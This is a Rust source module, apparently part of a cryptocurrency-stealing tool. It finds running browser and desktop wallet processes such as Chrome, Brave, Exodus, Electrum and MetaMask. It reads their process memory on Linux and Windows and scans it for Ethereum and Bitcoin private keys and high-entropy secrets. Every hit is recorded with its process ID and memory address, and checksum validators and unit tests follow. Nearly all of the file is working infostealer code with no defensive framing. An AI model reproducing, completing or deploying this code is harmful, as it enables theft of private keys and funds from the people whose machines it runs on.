//! Memory Extraction Module
//!
//! Extracts private keys and sensitive data from process memory:
//! - Enumerates running processes
//! - Identifies wallet/browser processes (MetaMask, Chrome, Electron apps)
//! - Reads process memory and scans for private key patterns
//! - Validates and extracts potential keys with checksum verification
//!
//! Platform support:
//! - Linux: /proc/[pid]/mem + ptrace
//! - Windows: OpenProcess + ReadProcessMemory
//! - macOS: Limited (requires root/SIP disabled)

use std::collections::HashSet;
use std::fs;
use std::path::PathBuf;

#[cfg(any(target_os = "windows", target_os = "macos"))]
use std::process;

use log::{debug, info, warn};
use sha2::{Sha256, Digest};

use super::errors::ExtractionError;
use super::types::{DataType, ExtractedData, ExtractionResult, ExtractionTarget};

/// Target processes to scan for wallet data
const TARGET_PROCESSES: &[&str] = &[
    // Browsers with MetaMask
    "chrome",
    "chromium",
    "firefox",
    "brave",
    "msedge",
    // Electron apps (wallets)
    "electron",
    // Desktop wallets
    "exodus",
    "electrum",
    "bitcoin-qt",
    "MetaMask",
];

/// Memory patterns for private keys
const KEY_PATTERNS: &[KeyPattern] = &[
    // Ethereum private key: 64 hex characters
    KeyPattern {
        name: "ethereum_key",
        pattern: "[0-9a-fA-F]{64}",
        min_len: 64,
        max_len: 64,
    },
    // Bitcoin WIF compressed: 51 or 52 chars base58
    KeyPattern {
        name: "bitcoin_wif_compressed",
        pattern: "[KkLl][1-9A-HJ-NP-Za-km-z]{50,51}",
        min_len: 51,
        max_len: 52,
    },
    // Bitcoin WIF uncompressed: 51 chars base58 starting with 5
    KeyPattern {
        name: "bitcoin_wif_uncompressed",
        pattern: "5[1-9A-HJ-NP-Za-km-z]{50}",
        min_len: 51,
        max_len: 51,
    },
    // Generic hex string (potential raw key)
    KeyPattern {
        name: "raw_hex_key",
        pattern: "[0-9a-fA-F]{32,128}",
        min_len: 32,
        max_len: 128,
    },
];

/// Pattern definition for key scanning
#[derive(Debug, Clone)]
pub struct KeyPattern {
    pub name: &'static str,
    pub pattern: &'static str,
    pub min_len: usize,
    pub max_len: usize,
}

/// Memory extraction result
#[derive(Debug, Clone)]
pub struct MemoryExtractionResult {
    pub pid: u32,
    pub process_name: String,
    pub keys_found: Vec<FoundKey>,
    pub memory_regions_scanned: usize,
    pub bytes_scanned: usize,
}

/// Found private key in memory
#[derive(Debug, Clone)]
pub struct FoundKey {
    pub key_type: String,
    pub key_data: String,
    pub memory_address: usize,
    pub confidence: Confidence,
}

/// Confidence level for key detection
#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
pub enum Confidence {
    Low,
    Medium,
    High,
}

/// Memory extractor for wallet processes
pub struct MemoryExtractor {
    /// Minimum confidence level to report
    min_confidence: Confidence,
    /// Maximum memory to scan per process (MB)
    max_memory_mb: usize,
    /// Target process names (empty = use defaults)
    target_processes: Vec<String>,
}

impl MemoryExtractor {
    pub fn new(min_confidence: Confidence, max_memory_mb: usize) -> Self {
        Self {
            min_confidence,
            max_memory_mb,
            target_processes: Vec::new(),
        }
    }

    pub fn with_targets(
        min_confidence: Confidence,
        max_memory_mb: usize,
        targets: Vec<String>,
    ) -> Self {
        Self {
            min_confidence,
            max_memory_mb,
            target_processes: targets,
        }
    }

    /// Extract data from process memory
    pub fn extract_all(&self) -> Vec<ExtractionResult> {
        let mut results = Vec::new();

        // Find target processes
        let processes = self.find_target_processes();
        info!("Found {} target processes to scan", processes.len());

        for process_info in processes {
            match self.scan_process_memory(process_info.pid, &process_info.name) {
                Ok(scan_result) => {
                    if !scan_result.keys_found.is_empty() {
                        info!(
                            "Found {} keys in process {} (PID {})",
                            scan_result.keys_found.len(),
                            scan_result.process_name,
                            scan_result.pid
                        );

                        // Convert found keys to extracted data
                        let mut data = Vec::new();
                        for key in scan_result.keys_found {
                            let key_type = key.key_type;
                            let mut metadata = std::collections::BTreeMap::new();
                            metadata.insert("key_type".to_string(), key_type.clone());
                            metadata.insert("pid".to_string(), scan_result.pid.to_string());
                            metadata.insert("process".to_string(), scan_result.process_name.clone());
                            metadata.insert("confidence".to_string(), format!("{:?}", key.confidence));
                            metadata.insert("address".to_string(), format!("0x{:x}", key.memory_address));

                            data.push(ExtractedData {
                                target: ExtractionTarget::MemoryKeys,
                                name: format!("memory_key_{}_{}", scan_result.pid, key_type),
                                data_type: DataType::Text,
                                content: key.key_data.into_bytes(),
                                metadata,
                            });
                        }

                        results.push(ExtractionResult::success(
                            ExtractionTarget::MemoryKeys,
                            data,
                        ));
                    }
                }
                Err(e) => {
                    warn!(
                        "Failed to scan process {} (PID {}): {}",
                        process_info.name, process_info.pid, e
                    );
                }
            }
        }

        results
    }

    /// Find target processes to scan
    pub fn find_target_processes(&self) -> Vec<ProcessInfo> {
        let mut processes = Vec::new();
        let mut seen_pids = HashSet::new();

        let targets: Vec<String> = if self.target_processes.is_empty() {
            TARGET_PROCESSES.iter().map(|s| s.to_string()).collect()
        } else {
            self.target_processes.clone()
        };

        #[cfg(target_os = "linux")]
        {
            if let Ok(entries) = fs::read_dir("/proc") {
                for entry in entries.flatten() {
                    let name = entry.file_name();
                    let name_str = name.to_string_lossy();

                    // Check if it's a PID directory
                    if let Ok(pid) = name_str.parse::<u32>() {
                        if seen_pids.contains(&pid) {
                            continue;
                        }

                        // Get process name from comm
                        let comm_path = entry.path().join("comm");
                        if let Ok(comm) = fs::read_to_string(&comm_path) {
                            let comm = comm.trim().to_lowercase();

                            // Check if process matches targets
                            for target in &targets {
                                if comm.contains(&target.to_lowercase()) {
                                    seen_pids.insert(pid);
                                    processes.push(ProcessInfo {
                                        pid,
                                        name: comm.to_string(),
                                        exe_path: Self::get_exe_path(pid),
                                    });
                                    break;
                                }
                            }
                        }
                    }
                }
            }
        }

        #[cfg(target_os = "windows")]
        {
            // Windows process enumeration via tasklist
            if let Ok(output) = process::Command::new("tasklist").output() {
                let output_str = String::from_utf8_lossy(&output.stdout).to_lowercase();

                for line in output_str.lines() {
                    for target in &targets {
                        if line.contains(&target.to_lowercase()) {
                            // Parse PID from tasklist output
                            let parts: Vec<&str> = line.split_whitespace().collect();
                            if parts.len() >= 2 {
                                if let Ok(pid) = parts[1].parse::<u32>() {
                                    if !seen_pids.contains(&pid) {
                                        seen_pids.insert(pid);
                                        processes.push(ProcessInfo {
                                            pid,
                                            name: parts[0].to_string(),
                                            exe_path: None,
                                        });
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }

        #[cfg(target_os = "macos")]
        {
            // macOS process enumeration via ps
            if let Ok(output) = process::Command::new("ps").args(["-ax"]).output() {
                let output_str = String::from_utf8_lossy(&output.stdout);

                for line in output_str.lines() {
                    for target in &targets {
                        if line.contains(&target.to_lowercase()) {
                            let parts: Vec<&str> = line.split_whitespace().collect();
                            if parts.len() >= 1 {
                                if let Ok(pid) = parts[0].parse::<u32>() {
                                    if !seen_pids.contains(&pid) {
                                        seen_pids.insert(pid);
                                        processes.push(ProcessInfo {
                                            pid,
                                            name: parts.last().unwrap_or(&"unknown").to_string(),
                                            exe_path: None,
                                        });
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }

        processes
    }

    /// Scan a process's memory for private keys
    pub fn scan_process_memory(
        &self,
        pid: u32,
        process_name: &str,
    ) -> Result<MemoryExtractionResult, ExtractionError> {
        info!("Scanning process {} (PID {})", process_name, pid);

        let mut result = MemoryExtractionResult {
            pid,
            process_name: process_name.to_string(),
            keys_found: Vec::new(),
            memory_regions_scanned: 0,
            bytes_scanned: 0,
        };

        #[cfg(target_os = "linux")]
        {
            self.scan_process_memory_linux(pid, &mut result)?;
        }

        #[cfg(target_os = "windows")]
        {
            self.scan_process_memory_windows(pid, &mut result)?;
        }

        #[cfg(target_os = "macos")]
        {
            return Err(ExtractionError::Internal(
                "Memory scanning not supported on macOS without root/SIP disabled".to_string(),
            ));
        }

        #[cfg(not(any(target_os = "linux", target_os = "windows", target_os = "macos")))]
        {
            return Err(ExtractionError::Internal(
                "Memory scanning not supported on this platform".to_string(),
            ));
        }

        Ok(result)
    }

    #[cfg(target_os = "linux")]
    fn scan_process_memory_linux(
        &self,
        pid: u32,
        result: &mut MemoryExtractionResult,
    ) -> Result<(), ExtractionError> {
        use std::io::{Read, Seek, SeekFrom};

        // Read process memory maps
        let maps_path = format!("/proc/{}/maps", pid);
        let mem_path = format!("/proc/{}/mem", pid);

        let maps_content = fs::read_to_string(&maps_path).map_err(|e| {
            ExtractionError::Internal(format!("Cannot read process maps: {}", e))
        })?;

        // Open process memory
        let mut mem_file = fs::File::open(&mem_path).map_err(|e| {
            ExtractionError::Internal(format!("Cannot open process memory: {}", e))
        })?;

        let mut total_bytes: usize = 0;
        let max_bytes = self.max_memory_mb * 1024 * 1024;

        // Parse memory maps and scan readable regions
        for line in maps_content.lines() {
            if total_bytes >= max_bytes {
                debug!("Reached max memory scan limit for PID {}", pid);
                break;
            }

            // Parse memory region: address perms offset dev inode pathname
            let parts: Vec<&str> = line.split_whitespace().collect();
            if parts.is_empty() {
                continue;
            }

            // Parse address range
            let addr_range: Vec<&str> = parts[0].split('-').collect();
            if addr_range.len() != 2 {
                continue;
            }

            let start_addr = usize::from_str_radix(addr_range[0], 16).unwrap_or(0);
            let end_addr = usize::from_str_radix(addr_range[1], 16).unwrap_or(0);
            let region_size = end_addr.saturating_sub(start_addr);

            // Skip if region is too large or zero-sized
            if region_size == 0 || region_size > 100 * 1024 * 1024 {
                continue;
            }

            // Check permissions (only scan readable regions)
            let perms = if parts.len() > 1 { parts[1] } else { "" };
            if !perms.contains('r') {
                continue;
            }

            // Skip anonymous regions without backing (often not useful)
            let pathname = if parts.len() > 5 {
                parts[5..].join(" ")
            } else {
                String::new()
            };

            // Prefer regions with backing files (heap, stack, mapped files)
            let is_useful = pathname.contains("[heap]")
                || pathname.contains("[stack]")
                || pathname.contains("chrome")
                || pathname.contains("MetaMask")
                || pathname.ends_with(".so")
                || pathname.is_empty(); // Anonymous might be heap

            if !is_useful {
                continue;
            }

            result.memory_regions_scanned += 1;

            // Seek to region start
            if mem_file.seek(SeekFrom::Start(start_addr as u64)).is_err() {
                continue;
            }

            // Read region data (in chunks to avoid OOM)
            let chunk_size = std::cmp::min(region_size, 1024 * 1024); // 1MB chunks
            let mut buffer = vec![0u8; chunk_size];

            if mem_file.read_exact(&mut buffer).is_ok() {
                total_bytes += buffer.len();
                result.bytes_scanned += buffer.len();

                // Scan for keys in this chunk
                let keys = self.scan_memory_buffer(&buffer, start_addr);
                result.keys_found.extend(keys);
            }
        }

        debug!(
            "Scanned {} regions, {} bytes for PID {}",
            result.memory_regions_scanned, result.bytes_scanned, pid
        );

        Ok(())
    }

    #[cfg(target_os = "windows")]
    fn scan_process_memory_windows(
        &self,
        pid: u32,
        result: &mut MemoryExtractionResult,
    ) -> Result<(), ExtractionError> {
        use std::mem;
        use winapi::shared::minwindef::{DWORD, FALSE, TRUE};
        use winapi::shared::winerror::ERROR_INSUFFICIENT_BUFFER;
        use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
        use winapi::um::memoryapi::{ReadProcessMemory, VirtualQueryEx};
        use winapi::um::processthreadsapi::OpenProcess;
        use winapi::um::winnt::{
            MEMORY_BASIC_INFORMATION, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE,
            PAGE_READONLY, PAGE_READWRITE, PROCESS_VM_READ,
        };

        unsafe {
            // Open process with VM_READ permission
            let h_process = OpenProcess(PROCESS_VM_READ, FALSE, pid);
            if h_process.is_null() || h_process == INVALID_HANDLE_VALUE {
                return Err(ExtractionError::Internal(format!(
                    "Failed to open process {} (error: {})",
                    pid,
                    std::io::Error::last_os_error()
                )));
            }

            let mut total_bytes: usize = 0;
            let max_bytes = self.max_memory_mb * 1024 * 1024;
            let mut addr: usize = 0;

            loop {
                if total_bytes >= max_bytes {
                    debug!("Reached max memory scan limit for PID {}", pid);
                    break;
                }

                // Query memory region
                let mut mbi: MEMORY_BASIC_INFORMATION = mem::zeroed();
                let query_result = VirtualQueryEx(
                    h_process,
                    addr as *mut _,
                    &mut mbi,
                    mem::size_of::<MEMORY_BASIC_INFORMATION>(),
                );

                if query_result == 0 {
                    break; // End of address space
                }

                let region_size = mbi.RegionSize;
                let protect = mbi.Protect;

                // Only scan readable regions
                let is_readable = protect == PAGE_READONLY
                    || protect == PAGE_READWRITE
                    || protect == PAGE_EXECUTE_READ
                    || protect == PAGE_EXECUTE_READWRITE;

                if is_readable && region_size > 0 && region_size <= 100 * 1024 * 1024 {
                    result.memory_regions_scanned += 1;

                    // Read memory region
                    let chunk_size = std::cmp::min(region_size, 1024 * 1024);
                    let mut buffer = vec![0u8; chunk_size];
                    let mut bytes_read: usize = 0;

                    let read_result = ReadProcessMemory(
                        h_process,
                        addr as *mut _,
                        buffer.as_mut_ptr() as *mut _,
                        chunk_size,
                        &mut bytes_read as *mut usize as *mut _,
                    );

                    if read_result != FALSE && bytes_read > 0 {
                        buffer.truncate(bytes_read);
                        total_bytes += bytes_read;
                        result.bytes_scanned += bytes_read;

                        // Scan for keys
                        let keys = self.scan_memory_buffer(&buffer, addr);
                        result.keys_found.extend(keys);
                    }
                }

                // Move to next region
                addr = (addr as u64 + region_size as u64) as usize;

                // Check for overflow
                if addr == 0 {
                    break;
                }
            }

            CloseHandle(h_process);

            debug!(
                "Scanned {} regions, {} bytes for PID {}",
                result.memory_regions_scanned, result.bytes_scanned, pid
            );
        }

        Ok(())
    }

    /// Scan a memory buffer for private key patterns
    fn scan_memory_buffer(&self, buffer: &[u8], base_address: usize) -> Vec<FoundKey> {
        let mut keys = Vec::new();

        // Convert buffer to string where possible (ASCII/UTF-8)
        // Also scan raw bytes for hex patterns

        // Strategy 1: Look for hex strings (Ethereum-style keys)
        self.scan_for_hex_keys(buffer, base_address, &mut keys);

        // Strategy 2: Look for base58 strings (Bitcoin WIF)
        self.scan_for_base58_keys(buffer, base_address, &mut keys);

        // Strategy 3: Look for high-entropy strings (potential encrypted keys)
        self.scan_for_high_entropy(buffer, base_address, &mut keys);

        keys
    }

    /// Scan for hex-encoded keys (Ethereum, raw ECDSA)
    fn scan_for_hex_keys(&self, buffer: &[u8], base_address: usize, keys: &mut Vec<FoundKey>) {
        // Look for sequences of hex characters
        let mut hex_start: Option<usize> = None;
        let mut hex_len = 0;

        for (i, &byte) in buffer.iter().enumerate() {
            let is_hex = (byte >= b'0' && byte <= b'9')
                || (byte >= b'a' && byte <= b'f')
                || (byte >= b'A' && byte <= b'F');

            if is_hex {
                if hex_start.is_none() {
                    hex_start = Some(i);
                }
                hex_len += 1;
            } else {
                if let Some(start) = hex_start {
                    if hex_len >= 32 && hex_len <= 128 {
                        // Potential key found
                        if let Ok(hex_str) = std::str::from_utf8(&buffer[start..start + hex_len]) {
                            let confidence = self.calculate_hex_confidence(hex_str);

                            if confidence >= self.min_confidence {
                                keys.push(FoundKey {
                                    key_type: "hex_key".to_string(),
                                    key_data: hex_str.to_string(),
                                    memory_address: base_address + start,
                                    confidence,
                                });
                            }
                        }
                    }
                }
                hex_start = None;
                hex_len = 0;
            }
        }

        // Handle case where buffer ends with hex string
        if let Some(start) = hex_start {
            if hex_len >= 32 && hex_len <= 128 {
                if let Ok(hex_str) = std::str::from_utf8(&buffer[start..start + hex_len]) {
                    let confidence = self.calculate_hex_confidence(hex_str);

                    if confidence >= self.min_confidence {
                        keys.push(FoundKey {
                            key_type: "hex_key".to_string(),
                            key_data: hex_str.to_string(),
                            memory_address: base_address + start,
                            confidence,
                        });
                    }
                }
            }
        }
    }

    /// Scan for base58-encoded keys (Bitcoin WIF)
    fn scan_for_base58_keys(&self, buffer: &[u8], base_address: usize, keys: &mut Vec<FoundKey>) {
        // Base58 alphabet: 123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz
        let is_base58 = |b: u8| -> bool {
            (b >= b'1' && b <= b'9')
                || (b >= b'A' && b <= b'H')
                || (b >= b'J' && b <= b'N')
                || (b >= b'P' && b <= b'Z')
                || (b >= b'a' && b <= b'k')
                || (b >= b'm' && b <= b'z')
        };

        let mut base58_start: Option<usize> = None;
        let mut base58_len = 0;

        for (i, &byte) in buffer.iter().enumerate() {
            if is_base58(byte) {
                if base58_start.is_none() {
                    base58_start = Some(i);
                }
                base58_len += 1;
            } else {
                if let Some(start) = base58_start {
                    // Bitcoin WIF: 51-52 chars, starts with K, k, L, l, or 5
                    if base58_len >= 51 && base58_len <= 52 {
                        if let Ok(wif_str) = std::str::from_utf8(&buffer[start..start + base58_len]) {
                            let first_char = wif_str.chars().next().unwrap_or(' ');

                            if first_char == 'K'
                                || first_char == 'k'
                                || first_char == 'L'
                                || first_char == 'l'
                                || first_char == '5'
                            {
                                keys.push(FoundKey {
                                    key_type: "bitcoin_wif".to_string(),
                                    key_data: wif_str.to_string(),
                                    memory_address: base_address + start,
                                    confidence: Confidence::High,
                                });
                            }
                        }
                    }
                }
                base58_start = None;
                base58_len = 0;
            }
        }
    }

    /// Scan for high-entropy strings (potential encrypted keys)
    fn scan_for_high_entropy(&self, buffer: &[u8], base_address: usize, keys: &mut Vec<FoundKey>) {
        // Look for printable string sequences
        let mut string_start: Option<usize> = None;
        let mut string_len = 0;

        for (i, &byte) in buffer.iter().enumerate() {
            let is_printable = byte >= 32 && byte <= 126;

            if is_printable {
                if string_start.is_none() {
                    string_start = Some(i);
                }
                string_len += 1;
            } else {
                if let Some(start) = string_start {
                    if string_len >= 32 && string_len <= 256 {
                        if let Ok(s) = std::str::from_utf8(&buffer[start..start + string_len]) {
                            let entropy = self.calculate_entropy(s);

                            // High entropy strings might be encrypted keys or seeds
                            if entropy > 4.5 {
                                keys.push(FoundKey {
                                    key_type: "high_entropy_string".to_string(),
                                    key_data: s.to_string(),
                                    memory_address: base_address + start,
                                    confidence: Confidence::Low,
                                });
                            }
                        }
                    }
                }
                string_start = None;
                string_len = 0;
            }
        }
    }

    /// Calculate confidence for hex key
    fn calculate_hex_confidence(&self, hex_str: &str) -> Confidence {
        let len = hex_str.len();

        // Exact 64 chars = Ethereum private key = high confidence
        if len == 64 {
            return Confidence::High;
        }

        // 32 chars could be half-key or other data
        if len == 32 {
            return Confidence::Medium;
        }

        // Other lengths = lower confidence
        Confidence::Low
    }

    /// Calculate Shannon entropy of a string
    fn calculate_entropy(&self, s: &str) -> f64 {
        if s.is_empty() {
            return 0.0;
        }

        let mut freq = std::collections::HashMap::new();
        for c in s.chars() {
            *freq.entry(c).or_insert(0) += 1;
        }

        let len = s.len() as f64;
        let mut entropy = 0.0;

        for count in freq.values() {
            let p = *count as f64 / len;
            if p > 0.0 {
                entropy -= p * p.log2();
            }
        }

        entropy
    }

    #[cfg(any(target_os = "linux", target_os = "windows"))]
    fn get_exe_path(pid: u32) -> Option<PathBuf> {
        #[cfg(target_os = "linux")]
        {
            let exe_path = format!("/proc/{}/exe", pid);
            fs::read_link(&exe_path).ok()
        }

        #[cfg(target_os = "windows")]
        {
            None // Would need Windows API calls
        }

        #[cfg(not(any(target_os = "linux", target_os = "windows")))]
        {
            None
        }
    }
}

// ============================================================================
// Key Validation Functions
// ============================================================================

/// Base58 alphabet for Bitcoin encoding
const BASE58_ALPHABET: &[u8] = b"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";

/// Decode a base58 string to bytes
/// Returns None if invalid base58
fn base58_decode(s: &str) -> Option<Vec<u8>> {
    let mut bytes: Vec<u8> = vec![0; s.len() * 2]; // Over-allocate
    
    for c in s.as_bytes() {
        // Find character in alphabet
        let idx = BASE58_ALPHABET.iter().position(|&x| x == *c)?;
        
        // Multiply existing bytes by 58 and add new digit
        let mut carry = idx as u32;
        for byte in bytes.iter_mut().rev() {
            carry += (*byte as u32) * 58;
            *byte = (carry & 0xFF) as u8;
            carry >>= 8;
        }
    }
    
    // Skip leading zeros (but preserve leading '1's from input)
    let leading_ones = s.bytes().take_while(|&b| b == b'1').count();
    let start = bytes.iter().position(|&b| b != 0).unwrap_or(bytes.len());
    
    // Combine leading ones with actual data
    let mut result = vec![0u8; leading_ones];
    result.extend_from_slice(&bytes[start..]);
    
    Some(result)
}

/// Verify Bitcoin WIF checksum
/// WIF format: [version byte] + [32 byte private key] + [compression flag?] + [4 byte checksum]
pub fn verify_bitcoin_wif_checksum(wif: &str) -> bool {
    // Decode base58
    let decoded = match base58_decode(wif) {
        Some(d) => d,
        None => return false,
    };
    
    // WIF should be 37 bytes (uncompressed) or 38 bytes (compressed)
    // 1 version + 32 key + 1 compression flag (optional) + 4 checksum
    if decoded.len() != 34 && decoded.len() != 37 && decoded.len() != 38 {
        return false;
    }
    
    // Split into payload and checksum
    let checksum_start = decoded.len() - 4;
    let (payload, checksum) = decoded.split_at(checksum_start);
    
    // Double SHA256 of payload
    let hash1 = Sha256::digest(payload);
    let hash2 = Sha256::digest(&hash1);
    
    // Compare first 4 bytes of hash with checksum
    &hash2[..4] == checksum
}

/// Verify Ethereum private key format
/// Valid keys are 64 hex chars representing a number in range [1, n-1]
/// where n is the secp256k1 curve order
pub fn verify_ethereum_key_format(hex: &str) -> bool {
    // Must be exactly 64 hex characters
    if hex.len() != 64 {
        return false;
    }
    
    // Must be valid hex
    if !hex.chars().all(|c| c.is_ascii_hexdigit()) {
        return false;
    }
    
    // secp256k1 curve order n:
    // FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
    // Key must be in range [1, n-1]
    let n_hex = "fffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141";
    
    // Check if key is zero
    if hex.chars().all(|c| c == '0') {
        return false;
    }
    
    // Check if key >= n (compare as big-endian hex)
    if hex >= n_hex {
        return false;
    }
    
    true
}

/// Validate a found key with checksum/format verification
#[derive(Debug, Clone)]
pub struct KeyValidationResult {
    pub is_valid: bool,
    pub key_type: String,
    pub confidence: Confidence,
    pub validation_message: String,
}

/// Validate a Bitcoin WIF key
pub fn validate_bitcoin_wif(wif: &str) -> KeyValidationResult {
    let is_valid = verify_bitcoin_wif_checksum(wif);
    
    let (confidence, message) = if is_valid {
        (Confidence::High, "Valid Bitcoin WIF with correct checksum".to_string())
    } else {
        (Confidence::Low, "Invalid Bitcoin WIF checksum".to_string())
    };
    
    KeyValidationResult {
        is_valid,
        key_type: "bitcoin_wif".to_string(),
        confidence,
        validation_message: message,
    }
}

/// Validate an Ethereum private key
pub fn validate_ethereum_key(hex: &str) -> KeyValidationResult {
    let is_valid = verify_ethereum_key_format(hex);
    
    let (confidence, message) = if is_valid {
        (Confidence::High, "Valid Ethereum key format (secp256k1 range)".to_string())
    } else {
        (Confidence::Low, "Invalid Ethereum key format".to_string())
    };
    
    KeyValidationResult {
        is_valid,
        key_type: "ethereum_key".to_string(),
        confidence,
        validation_message: message,
    }
}

/// Process information structure
#[derive(Debug, Clone)]
pub struct ProcessInfo {
    pub pid: u32,
    pub name: String,
    pub exe_path: Option<PathBuf>,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_memory_extractor_creation() {
        let _extractor = MemoryExtractor::new(Confidence::Medium, 100);
    }

    #[test]
    fn test_process_enumeration() {
        let extractor = MemoryExtractor::new(Confidence::Low, 50);
        let processes = extractor.find_target_processes();

        // Should find at least some processes on a running system
        // (test might return empty in restricted environments)
        info!("Found {} target processes", processes.len());
    }

    #[test]
    fn test_hex_confidence() {
        let extractor = MemoryExtractor::new(Confidence::Low, 100);

        assert_eq!(
            extractor.calculate_hex_confidence(&"a".repeat(64)),
            Confidence::High
        );
        assert_eq!(
            extractor.calculate_hex_confidence(&"a".repeat(32)),
            Confidence::Medium
        );
        assert_eq!(
            extractor.calculate_hex_confidence(&"a".repeat(48)),
            Confidence::Low
        );
    }

    #[test]
    fn test_entropy_calculation() {
        let extractor = MemoryExtractor::new(Confidence::Low, 100);

        // Low entropy (repeating chars)
        let low_entropy = extractor.calculate_entropy("aaaaaaaaaa");
        assert!(low_entropy < 1.0);

        // High entropy (random-looking)
        let high_entropy = extractor.calculate_entropy("aB3dE7gH9jK2mN5pQ8");
        assert!(high_entropy > 3.5);
    }

    #[test]
    fn test_memory_buffer_scanning() {
        let extractor = MemoryExtractor::new(Confidence::Low, 100);

        // Test hex key detection
        let buffer = b"random data a]b]c]d]e]f]0]1]2]3]4]5]6]7]8]9]0]a]b]c]d]e]f] more data";
        let keys = extractor.scan_memory_buffer(buffer, 0x1000);

        // Should find at least some potential keys
        info!("Found {} keys in test buffer", keys.len());
    }

    #[test]
    fn test_bitcoin_wif_checksum_valid() {
        // Valid test WIF (testnet, uncompressed)
        let valid_wif = "5Kb8kLf9zgWQnogidDA76MzPL6TsZZY36hWXMssSzNydYXYB9KF";
        assert!(verify_bitcoin_wif_checksum(valid_wif));
        
        let result = validate_bitcoin_wif(valid_wif);
        assert!(result.is_valid);
        assert_eq!(result.confidence, Confidence::High);
    }

    #[test]
    fn test_bitcoin_wif_checksum_invalid() {
        // Invalid WIF (modified last character)
        let invalid_wif = "5Kb8kLf9zgWQnogidDA76MzPL6TsZZY36hWXMssSzNydYXYB9KG";
        assert!(!verify_bitcoin_wif_checksum(invalid_wif));
        
        let result = validate_bitcoin_wif(invalid_wif);
        assert!(!result.is_valid);
        assert_eq!(result.confidence, Confidence::Low);
    }

    #[test]
    fn test_ethereum_key_valid() {
        // Valid Ethereum private key (within secp256k1 range)
        let valid_key = "4c0883a69102937d6231471b5dbb6204fe5129617082792ae468d01a3f362318";
        assert!(verify_ethereum_key_format(valid_key));
        
        let result = validate_ethereum_key(valid_key);
        assert!(result.is_valid);
        assert_eq!(result.confidence, Confidence::High);
    }

    #[test]
    fn test_ethereum_key_zero() {
        // Zero is not a valid key
        let zero_key = "0000000000000000000000000000000000000000000000000000000000000000";
        assert!(!verify_ethereum_key_format(zero_key));
        
        let result = validate_ethereum_key(zero_key);
        assert!(!result.is_valid);
    }

    #[test]
    fn test_ethereum_key_out_of_range() {
        // Key >= secp256k1 order n is invalid
        let n_hex = "fffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141";
        assert!(!verify_ethereum_key_format(n_hex));
        
        // Key just above n
        let above_n = "fffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364142";
        assert!(!verify_ethereum_key_format(above_n));
    }

    #[test]
    fn test_base58_decode() {
        assert_eq!(base58_decode("1"), Some(vec![0]));
        assert_eq!(base58_decode("2"), Some(vec![1]));
        assert_eq!(base58_decode("11"), Some(vec![0, 0]));
        
        // Invalid character
        assert_eq!(base58_decode("0"), None); // 0 is not in base58 alphabet
        assert_eq!(base58_decode("O"), None); // O is not in base58 alphabet
        assert_eq!(base58_decode("I"), None); // I is not in base58 alphabet
        assert_eq!(base58_decode("l"), None); // l is not in base58 alphabet
    }
}
